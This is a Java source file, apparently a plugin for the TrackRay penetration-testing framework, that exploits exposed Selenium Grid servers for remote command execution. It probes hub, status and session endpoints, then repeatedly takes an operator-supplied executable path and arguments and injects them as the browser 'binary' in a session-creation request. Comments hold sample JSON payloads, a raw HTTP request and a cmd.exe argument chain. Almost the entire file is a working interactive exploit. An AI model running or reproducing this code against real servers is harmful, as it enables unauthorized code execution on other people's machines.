package com.trackray.module.plugin.server;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Rule;
import com.trackray.base.enums.HttpMethod;
import com.trackray.base.plugin.WebSocketPlugin;
import net.sf.json.JSONArray;
import net.sf.json.JSONObject;
import java.util.Map;


@Rule(websocket = true, params = {@Param(key = "target", desc = "目标地址")})
//@Plugin(title = "Selenium Server 远程命令执行" , author = "blue" )
public class SeleniumServerRCE extends WebSocketPlugin{


    @Override
    public boolean check(Map param) {
        target =param.get(currentParams()[0].key()).toString();
        return !target.isEmpty();
    }
    @Override
    public Object start() {
        boolean flag =false;
        send("[*]是否进行基本信息探测?[y/n]");
        if (getInput().equals("y")){
            crawlerPage.getRequest().setUrl(target.concat(hub));
            fetcher.run(crawlerPage);
            if (crawlerPage.getResponse().getStatus().getStatusCode() == 200){
                send("[+]"+hub+"存在");
            }
            crawlerPage.getRequest().setUrl(target.concat(state));
            fetcher.run(crawlerPage);
            if (crawlerPage.getResponse().getStatus().getStatusCode() == 200) {
                send("[+]"+state+"存在");
                try {
                    JSONObject json = crawlerPage.getResponse().getRespFormatJson();
                    if (json!=null){
                        JSONObject value = json.getJSONObject("value");
                        String version = value.getJSONObject("java").getString("version");
                        JSONObject os = value.getJSONObject("os");
                        JSONObject build = value.getJSONObject("build");
                        send("[+]java version:"+version);
                        send("[+]os version:"+os.toString());
                        send("[+]build:"+build.toString());
                    }
                }catch (Exception e){
                    send("[-]返回信息格式不正确");
                    flag=true;
                }
            }

            crawlerPage.getRequest().setUrl(target.concat(sessions));
            fetcher.run(crawlerPage);
            if (crawlerPage.getResponse().getStatus().getStatusCode() == 200) {
                send("[+]"+sessions+"存在");
                try {
                    JSONObject json = crawlerPage.getResponse().getRespFormatJson();
                    JSONArray values = json.getJSONArray("value");
                    for (Object value : values) {
                        JSONObject v = (JSONObject) value;
                        v = v.getJSONObject("capabilities");
                        String browser = v.getString("browserName");
                        String str = v.toString();
                        send("===========================");
                        send(browser+"\t"+str);

                    }
                }catch (Exception e){
                    send("[-]返回信息格式不正确");
                    flag = true;
                }
            }
        }
        if (flag){
            send("[*]探测信息时存在问题，是否继续?[y/n]");
            String input = getInput().toLowerCase();
            if (input.contains("n"))
                return "[+]END";
        }
        send("[*]选择目标服务可能使用的浏览器序号,一般为chrome或firefox");
        for (int i = 0; i < browses.length; i++) {
            send("{"+i+"}\t"+browses[i]);
        }
        int num = 0;
        try {
            String tmp = getInput().trim();
             num = Integer.parseInt(tmp);
             if (num>=browses.length)
                 num=0;
        }catch (Exception e){

        }

        while (true){
            send("[*]请输入可执行的二进制文件绝对路径,输入quit结束");
            String command = getInput();
            if (command.equals("quit"))
                break;
            this.exec(command , browses[num]);
        }
        return "[+]END";
    }

    private void exec(String command, String brows) {
        crawlerPage.getRequest().setUrl(target.concat(session));
        crawlerPage.getRequest().setHttpMethod(HttpMethod.POST);
        JSONObject payload=new JSONObject();
        if (brows==browses[0]){
            payload = genChromePayload();
            JSONObject desiredCapabilities = payload.getJSONObject("desiredCapabilities");
            desiredCapabilities.put("browserName",brows);
            JSONObject chromeOptions = desiredCapabilities.getJSONObject("chromeOptions");
            chromeOptions.put("binary",command);
            JSONArray args = chromeOptions.getJSONArray("args");
            send("[*]请输入二进制文件后的参数，多个参数请按照['aaa','bbb']json数组格式填写");
            String arg = getInput();
            if (arg.contains("[")){
                try {
                    args.addAll(JSONArray.fromObject(arg));
                }catch (Exception e){
                }
            }else{
                args.add(arg);
            }

        }
        crawlerPage.getRequest().setParamStr(payload.toString());
        fetcher.run(crawlerPage);
        int statusCode = crawlerPage.getResponse().getStatus().getStatusCode();
        send("[*]response code:"+statusCode);
        String contentString = crawlerPage.getResponse().getStatus().getContentString();
        System.out.println(contentString);
    }

    private JSONObject genChromePayload(){
        String p = "{\"desiredCapabilities\":{\"browserName\":\"%s\",\"chromeOptions\":{\"args\":[],\"extensions\":[],\"binary\":\"c:/windows/system32/calc.exe\"},\"version\":\"\",\"platform\":\"ANY\"}}";
        return JSONObject.fromObject(p);
    }

    private JSONObject genFirefoxPayload(){
        String p = "{\n" +
                "  \"desiredCapabilities\": {\n" +
                "    \"firefox_binary\": \"c:/windows/system32/calc.exe\",\n" +
                "    \"moz:firefoxOptions\": {\n" +
                "      \"binary\": \"c:/windows/system32/calc.exe\",\n" +
                "      \"prefs\": {},\n" +
                "      \"args\": []\n" +
                "    }\n" +
                "  },\n" +
                "  \"requiredCapabilities\": {},\n" +
                "  \"capabilities\": {\n" +
                "    \"desiredCapabilities\": {\n" +
                "      \"firefox_binary\": \"c:/windows/system32/calc.exe\",\n" +
                "      \"moz:firefoxOptions\": {\n" +
                "        \"binary\": \"c:/windows/system32/calc.exe\",\n" +
                "        \"prefs\": {},\n" +
                "        \"args\": []\n" +
                "      }\n" +
                "    },\n" +
                "    \"requiredCapabilities\": {},\n" +
                "    \"alwaysMatch\": {},\n" +
                "    \"firstMatch\": [\n" +
                "      {\n" +
                "        \"moz:firefoxOptions\": {\n" +
                "          \"binary\": \"c:/windows/system32/calc.exe\",\n" +
                "          \"prefs\": {},\n" +
                "          \"args\": []\n" +
                "        }\n" +
                "      }\n" +
                "    ]\n" +
                "  }\n" +
                "}";
        return JSONObject.fromObject(p);

    }
    /**
     *  请输入:c:/windows/system32/cmd.exe
        请输入二进制文件后的参数，多个参数请按照['aaa','bbb']json数组格式填写
        请输入:["&echo","123",">d:/1.txt","&calc"]
     */
    /**
     * Payload
     * {
     "capabilities": {
     "desiredCapabilities": {
     "browserName": "chrome",
     "chromeOptions": {
     "args": [],
     "extensions": [],
     "binary": "c:/windows/system32/calc.exe"
     },
     "version": "",
     "platform": "ANY"
     }
     }
     }
     */

    /**
     *
     *
         POST /wd/hub/session HTTP/1.1
         Content-Type: application/json; charset=utf-8
         Content-Length: 908
         Host: 192.168.0.100:4444
         Connection: Keep-Alive
         User-Agent: Apache-HttpClient/4.5.3 (Java/1.8.0_131)
         Accept-Encoding: gzip,deflate

         {
         "desiredCapabilities": {
         "browserName": "chrome",
         "chromeOptions": {
         "args": [],
         "extensions": [],
         "binary": "c:/windows/system32/calc.exe",
         "prefs": {
         "download.prompt_for_download": false,
         "download.default_directory": "D:\\Download"
         }
         },
         "version": "",
         "platform": "ANY"
         },
         "requiredCapabilities": {},
         "capabilities": {
         "desiredCapabilities": {
         "browserName": "chrome",
         "chromeOptions": {
         "args": [],
         "extensions": [],
         "binary": "c:/windows/system32/calc.exe",
         "prefs": {
         "download.prompt_for_download": false,
         "download.default_directory": "D:\\Download"
         }
         },
         "version": "",
         "platform": "ANY"
         },
         "requiredCapabilities": {},
         "alwaysMatch": {},
         "firstMatch": [
         {
         "browserName": "chrome"
         }
         ]
         }
         }
     *
     */
    private String target;
    private static String hub = "/wd/hub/static/resource/hub.html";
    private static String state = "/wd/hub/status";
    private static String session = "/wd/hub/session";
    private static String sessions = "/wd/hub/sessions";

    private static String[] browses = { "chrome" , "firefox", "MicrosoftEdge", "internet explorer", "android", "htmlunit", "opera", "safari" };

}
